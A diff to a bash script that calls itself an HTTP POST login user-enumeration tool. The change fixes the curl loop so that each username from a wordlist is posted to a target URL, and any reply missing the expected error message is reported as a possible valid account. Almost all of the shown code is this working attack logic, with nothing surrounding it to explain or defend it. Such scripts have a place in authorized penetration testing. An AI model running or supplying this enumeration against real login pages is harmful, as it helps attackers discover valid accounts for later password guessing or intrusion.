@@ -16,7 +16,9 @@ userFound=false
 printf "Simple HTTP POST login User Enumeration Script.\n"
 while read username
  do
- try=$(curl -s --data 'username=admin&password=password' $url | grep "$errorMsg" | wc -l)
+ # printf "Trying: $username\n" # DEBUG
+ # curl -s --data 'username=$username&password=password' $url | grep "$errorMsg"
+ try=$(curl -s --data "username=$username&password=password" $url | grep "$errorMsg" | wc -l)
  if [[ "$try" < 1 ]] && [[ "$try" != "" ]]
   then
    printf "\n[!] Possible username found: [$username]\n[*] OUTPUT: $response"
